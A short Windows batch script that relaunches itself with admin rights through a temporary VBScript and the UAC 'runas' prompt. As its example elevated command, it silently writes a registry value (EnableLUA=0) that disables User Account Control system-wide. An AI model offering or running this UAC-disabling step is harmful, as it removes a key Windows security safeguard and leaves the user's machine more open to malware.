@echo off
:: Batch script with auto-elevation to run with admin rights

:: Check if user is admin
net session >nul 2>&1
if %errorLevel% == 0 (
    echo Running with admin rights.
    goto AdminSection
) else (
    echo Requesting administrative privileges...
    goto UACPrompt
)

:UACPrompt
:: Create VBScript to trigger UAC prompt
echo Set UAC = CreateObject("Shell.Application") > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
exit /b

:AdminSection
:: Clean up the temporary VBScript
if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs"

:: Your elevated commands go below this line
echo Successfully running with elevated permissions!

:: Example: Disable UAC
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
echo UAC has been disabled. You may need to restart your computer.

:: Pause so user can see output
pause
